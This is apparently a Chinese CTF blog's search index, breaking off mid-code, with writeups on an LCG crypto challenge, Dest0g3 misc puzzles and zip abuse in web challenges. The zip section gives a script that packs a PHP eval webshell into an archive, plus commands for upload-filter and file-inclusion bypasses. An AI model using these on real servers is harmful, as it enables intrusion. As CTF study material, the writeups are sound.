<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HWS-Crypto</title>
    <url>/2022/08/HWS-Crypto/</url>
    <content><![CDATA[<p>这场比赛诶，参加的莫名其妙的，还没来得及复现，就做出来一个Crypto。qwq</p>
<span id="more"></span>
<h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h3>
<h4 id="hws-easyrsa"><a class="markdownIt-Anchor" href="#hws-easyrsa"></a> HWS-easyRSA</h4>
<h5 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程：</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="number">31893593182018727625473530765941216190921866039118147474754069955393226712079257707838327486268599271803</span></span><br><span class="line">seed0 = <span class="number">25820280412859586557218124484272275594433027771091486422152141535682739897353623931875432576083022273940</span></span><br><span class="line">seed1 = <span class="number">24295465524789348024814588142969609603624462580932512051939198335014954252359986260009296537423802567677</span></span><br><span class="line">seed2 = <span class="number">14963686422550871447791815183480974143372785034397446416396172429864269108509521776424254168481536292904</span></span><br><span class="line"></span><br><span class="line">a = (seed2 - seed1) * gmpy2.invert(seed1 - seed0, m) % m</span><br><span class="line">b = (seed1 - a * seed0) % m</span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, m, s=<span class="number">1</span>, t=<span class="number">0</span>, N=<span class="number">0</span>: (m &lt; <span class="number">2</span> <span class="keyword">and</span> t % N <span class="keyword">or</span> MMI(m, A % m, t, s - A // m * t, N <span class="keyword">or</span> m), -<span class="number">1</span>)[m &lt; <span class="number">1</span>]  <span class="comment"># 逆元计算</span></span><br><span class="line">ani = MMI(a, m)</span><br><span class="line">seed = seed2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    seed = (ani * (seed - b)) % m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中zip文件的使用</title>
    <url>/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>这是一场招新赛中的一个赛题做的总结，大佬们锤轻点QwQ</p>
<span id="more"></span>
<h1 id="ctf中zip文件的使用"><a class="markdownIt-Anchor" href="#ctf中zip文件的使用"></a> CTF中zip文件的使用</h1>
<p>在CTF中zip文件的出现频率很高，大多出现在Misc和Crypto赛道以加密和修复的姿势出现，但本文主要讲解的是在Web赛道上zip文件的一下利用方式。</p>
<h2 id="利用姿势onezip报错解压"><a class="markdownIt-Anchor" href="#利用姿势onezip报错解压"></a> 利用姿势ONE—zip报错解压</h2>
<p>利用条件：只能上传压缩包，且压缩包内的图片会保留，其他都会删除，对目录穿越做了限制； 只能从解压方面入手。</p>
<h3 id="文件名报错"><a class="markdownIt-Anchor" href="#文件名报错"></a> 文件名/报错</h3>
<p>在PHP架构中，有一个自带的解压函数ZipArchive。这里的报错解压就是使ZipArchive识别文件出错，但是能够正常保留压缩包中的文件。例如在windows下不允许文件中包含</p>
<p>冒号(😃，我们就可以在010editor中修改压缩文件的deFileName属性的值，此时解压就会出错，但是一句话代码就会保留下来。在Linux下也有类似的方法，可以将文件名改成5个斜杠(/////)，此时Linux写解压也会出错，但是一句话木马被保留下来了。</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106143638292.png" alt="image-20221106143638292"></p>
<h3 id="超长文件名报错伴随一句话木马"><a class="markdownIt-Anchor" href="#超长文件名报错伴随一句话木马"></a> 超长文件名报错伴随一句话木马</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">mf = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(mf, mode=<span class="string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">b&#x27;@&lt;?php eval($_POST[TW])?&gt;&#x27;</span>)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;A&#x27;</span> * <span class="number">5000</span>, <span class="string">b&#x27;AAAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shell.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(mf.getvalue())</span><br></pre></td></tr></table></figure>
<h2 id="利用姿势two同名解压"><a class="markdownIt-Anchor" href="#利用姿势two同名解压"></a> 利用姿势Two–同名解压</h2>
<h3 id="压缩包中目录名和一个文件名相同"><a class="markdownIt-Anchor" href="#压缩包中目录名和一个文件名相同"></a> 压缩包中目录名和一个文件名相同</h3>
<p>首先创建一个shell.php，内包含一句话木马，先把压缩进压缩包</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">zip</span> -y test1.<span class="keyword">zip</span> <span class="keyword">shell</span>.php</span><br></pre></td></tr></table></figure>
<p>然后删除shell.php创建一个同名文件夹，里面随便放一些东西，再压缩进同一个压缩包</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mkdir</span> <span class="keyword">shell</span>.php</span><br><span class="line"><span class="keyword">zip</span> -y test1.<span class="keyword">zip</span> <span class="keyword">shell</span>.php/1.txt</span><br></pre></td></tr></table></figure>
<h3 id="创建0文件夹绕过"><a class="markdownIt-Anchor" href="#创建0文件夹绕过"></a> 创建“0”文件夹绕过</h3>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145439629.png" alt="image-20221106145439629"></p>
<p>这里的read()函数不会处理0文件夹，所以这里的array返回值为空。</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145936187.png" alt="image-20221106145936187"></p>
<p>所以file_list得到的也是空值，在执行删除目录或者文件的时候便不会删除到0文件夹下的内容。</p>
<h2 id="利用姿势three目录穿越"><a class="markdownIt-Anchor" href="#利用姿势three目录穿越"></a> 利用姿势Three–目录穿越</h2>
<h3 id="软连接"><a class="markdownIt-Anchor" href="#软连接"></a> 软连接</h3>
<p>目前遇到的赛题MT-CTF初赛  ，由于没找到环境现在打一下，就着比赛时候的writeup说一下</p>
<p>先说一下软连接</p>
<blockquote>
<p>软连接是linux中一个常用命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。</p>
<p>具体用法是：ln -s 源文件 目标文件。</p>
<p>当 我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在其它的 目录下用ln命令链接（link）就可以，不必重复的占用磁盘空间</p>
</blockquote>
<p><a href="..........%5C%E6%A1%8C%E9%9D%A2%5CCTF%5CMT_CTF%5CMT-CTF%E5%86%B3%E8%B5%9B-Writeup.pdf">MT-CTF决赛-Writeup.pdf</a></p>
<h2 id="利用姿势four文件包含"><a class="markdownIt-Anchor" href="#利用姿势four文件包含"></a> 利用姿势Four–文件包含</h2>
<h2 id="inephp-0ctf2021"><a class="markdownIt-Anchor" href="#inephp-0ctf2021"></a> inephp - 0ctf2021</h2>
<p><a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021/1linephp">这个题目</a>取自非常经典的文件包含题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">(<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;yxxx&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>) &amp;&amp; @<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;@&lt;?php&#x27;</span> ? <span class="keyword">include</span>(<span class="variable">$_</span>) : <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) &amp;&amp; <span class="keyword">include</span>(<span class="string">&#x27;phpinfo.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>这里限制后缀必须是<code>.php</code>的文件才能够实现包含。这里可以利用zip来构成条件竞争来上传。</p>
<p>这里需要传一个构造过的zip包，然后令<code>yxxx=zip:///tmp/sess_evil#1</code>这样，让后续的代码能够include它。但显然通过<em>session.upload_progress</em>搞上去的文件最开始的字符串内容是<code>upload_progress_</code>，所以必须想办法绕过<code>@substr(file($_)[0],0,6) === '@&lt;?php'</code>的判断。</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/1.png" alt="1.png"></p>
<p>根据<a href="https://github.com/corkami/collisions#zip">上图</a>，我们不难发现<code>End of Central Directory</code>(中央目录结束)里面有一个<code>offset of start of central</code>(中心起点的偏移量)，左下的示意图说明程序处理zip文件的时候首先从这个文件末尾出发，根据偏移找到Central Directory<code>(中央目录)的头位置，然后再根据</code>relative offset of local header<code>(本地头的相对偏移量)找到整个zip文件头的位置，也就指向</code>local file header signature`(本地文件头签名)</p>
<p><strong>zip构造</strong></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">zip</span> <span class="keyword">shell</span>.<span class="keyword">zip</span> 1.php</span><br><span class="line">echo -<span class="keyword">n</span> <span class="string">&quot;upload_progress_&quot;</span> &gt; f</span><br><span class="line"><span class="keyword">cat</span> f <span class="keyword">shell</span>.<span class="keyword">zip</span> &gt; b.<span class="keyword">zip</span></span><br><span class="line"><span class="keyword">zip</span> -F b.<span class="keyword">zip</span> --<span class="keyword">out</span> c.<span class="keyword">zip</span></span><br></pre></td></tr></table></figure>
<p>这里的解决办法就是修改这两个offset，这样zip协议能够跳开前面几个字符找到正确的位置。另外，CRC的值我们也不必进行修改，因为<a href="https://stackoverflow.com/questions/63647618/how-to-validate-crc-32-calculation-of-zip-file">这里的crc-32其实是根据crc前面的相关信息计算出来的结果</a>。因为最开始的字符串内容是<code>upload_progress_</code>，其长度为16，因此这两个offset（从010editor来看就是<code>elDirectoryOffset</code>(el目录偏移量)和<code>deHeaderOffset</code>(de标头偏移量)）都要加上16。</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106185559363.png" alt="image-20221106185559363"></p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106184440246.png" alt="image-20221106184440246"></p>
]]></content>
      <categories>
        <category>技术分享复现</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello</title>
    <url>/2022/09/Hello/</url>
    <content><![CDATA[<p>你不喜欢wlop么？</p>
<span id="more"></span>
<p><img src="/2022/09/Hello/wlop04.jpg" alt="wlop04"></p>
]]></content>
  </entry>
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <url>/2022/08/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="dest0g3-520迎新赛"><a class="markdownIt-Anchor" href="#dest0g3-520迎新赛"></a> Dest0g3 520迎新赛</h1>
<p>Dest0g3首次招新啦！</p>
<p>Dest0g3 Team现逐步发展到各大高校及安全公司均有成员分布，在过去的半年里先后取得L3HCTF第十、SCTF第六及SUSCTF第四的优异成绩。</p>
<p>首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。</p>
<p>Dest0g3期待更多新生力量的加入，如有意向请在赛后提交wp与简历，或联系@Dest0g3 Team （QQ：1115230222）</p>
<p>比赛时间：2022.5.20 10:00 - 5.27 10:00</p>
<p>题目分类：Web、Pwn、Misc、Crypto、Re、AI、BlockChain</p>
<p>题目难度：萌新</p>
<p>比赛类型：个人赛</p>
<p>比赛交流QQ群：923945203</p>
<p>个人赛奖励：总榜前10及各方向前三均可获得《从0到1：CTFer成长之路》一本 + 定制U盘（32G）一个</p>
<span id="more"></span>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="welcome-to-fxxking-destctf"><a class="markdownIt-Anchor" href="#welcome-to-fxxking-destctf"></a> Welcome to fxxking DestCTF</h3>
<p>**题目描述：**关注公众号并回复：Give me the fxxking flag</p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/8fc59c32ce5bcf7da3917ad4a3a023ba/jpg">https://files.buuoj.cn/files/8fc59c32ce5bcf7da3917ad4a3a023ba/jpg</a></p>
<p><strong>做题过程：</strong></p>
<p>将附件拖入浏览器查看。获得二维码，扫码关注公众号，输入提示给的：Give me the fxxking flag</p>
<p><img src="https://img-blog.csdnimg.cn/c2001876496f4c2292e236787d6a1064.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获取flag：Dest0g3{W31c0m3_t0_DestCTF2022!}</p>
<h3 id="pngenius"><a class="markdownIt-Anchor" href="#pngenius"></a> Pngenius</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/5a64d4c2532f28b79aa99089c3f76ff5/Dest0g3.png">https://files.buuoj.cn/files/5a64d4c2532f28b79aa99089c3f76ff5/Dest0g3.png</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、获取图片是PNG格式，首先想到的就是LSB隐写，使用工具stegslove查看</p>
<p>在r 0 g 0 b 0处发现有变化。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/359af78c6f5a4c589951a0fb06d41b4f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/86ffb3a2a628455bbc8753c9aae546c4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/56a9f5ded36347ce90a55fc14aa8cbc5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、使用stegslove自带的Data Extract 数据提取工具对三处异常，进行查看。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/321e9f64811e4ff9b9a7173a133de680.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/bbb2325b1ca949c78345c512a80b0baf.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>3、 得到一个压缩包的解压密码，返回图片，使用binwalk进行扫描，并提取压缩包</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2c43f5298f2944ff9db941fc40514f10.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>4、输入压缩包密码Weak_Pas5w0rd，打开压缩包，获取flag.txt。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c0beb361c71f491cb15e387b11233fab.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获取flag：Dest0g3{2908C1AA-B2C1-B8E6-89D1-21B97D778603}</p>
<h3 id="easyencode"><a class="markdownIt-Anchor" href="#easyencode"></a> EasyEncode</h3>
<p>**题目描述：**Enjoy Decoding</p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/2fb77a72cba82a4c9a749998a1073e58/encode.zip">https://files.buuoj.cn/files/2fb77a72cba82a4c9a749998a1073e58/encode.zip</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>下载附件，是个ZIP文件，解压，发现有加密，丢进010 edtier中查看</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/9366225f80f442268e5d39bc432269e6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、发现不是伪加密，于是试着用ARCHPR爆破一下，密码长度选择4-6位。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/014592d521754099affcc8d040053bb5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得密码100861，解压压缩包,打开文本文件，发现摩斯编码：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/69d19aa758f54c6ca6765360a63ef07e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>3、下面就是解码过程：</p>
</blockquote>
<blockquote>
<p>运用在线工具<a href="https://www.lddgo.net/encrypt/morse">在线摩斯密码翻译器 (lddgo.net)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7cb0a08d95c84f52a15831cb7f247b5b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得一串Hex（十六进制）编码，运用在线工具<a href="https://the-x.cn/encodings/Hex.aspx">HEX转字符 十六进制转字符 hex gb2312 gbk utf8 汉字内码转换 - The X 在线工具 (the-x.cn)</a>转字符：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2051da8075304abcae5cca6dbdc2ddae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得一串unicode编码，使用在线工具<a href="https://tool.chinaz.com/tools/unicode.aspx">Unicode编码转换 - 站长工具 (chinaz.com)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/484a9cb95ec9408d9ad2905d7b59f600.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>“%3D”在url编码中是“=”’，所以进行base64解码，运用在线工具：<a href="https://the-x.cn/zh-cn/base64">Base64解码 Base64编码 UTF8 GB2312 UTF16 GBK 二进制 十六进制 解密 - The X 在线工具 (the-x.cn)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/da9e343502734ca89a6f8cd6baf55939.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获得flag：Dest0g3{Deoding_1s_e4sy_4_U}</p>
<h3 id="你知道js吗"><a class="markdownIt-Anchor" href="#你知道js吗"></a> 你知道js吗</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/5f1fc294b6468f733b774ceee6106062/flag">https://files.buuoj.cn/files/5f1fc294b6468f733b774ceee6106062/flag</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、下载，附件，懒了，不想开010，直接吧附件扔到浏览器，浏览器自动编译后下载了一个flag.zip文件</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ffa9b6c56dc641e0b5db406f890eb691.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、打开压缩包，看到一堆XML格式的文件，直接扔浏览器里。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/fe2bbcc56eea4328b710beee5cdfb457.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>在docoment.xml中发现三串base64特征字符，拼接解码后获得</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">assembly</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> <span class="attr">manifestVersion</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">trustInfo</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">requestedExecutionLevel</span> <span class="attr">level</span>=<span class="string">&quot;asInvoker&quot;</span> <span class="attr">uiAccess</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dpiAwareness</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;</span>&gt;</span>Do you know js<span class="tag">&lt;/<span class="name">dpiAwareness</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="built_in">unescape</span>(<span class="string">&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>辨别解码后是，url编码，在线工具解码<a href="https://the-x.cn/zh-cn/UrlDecode.aspx">UrlDecode解码/UrlEncode编码 GB2312 UTF8 - The X 在线工具 (the-x.cn)</a>：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Do You Know js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span></span></span><br><span class="line"><span class="tag">  <span class="attr">APPLICATIONNAME</span>=<span class="string">&quot;Do You Know js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ID</span>=<span class="string">&quot;Inception&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">VERSION</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">SCROLL</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;feature&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">				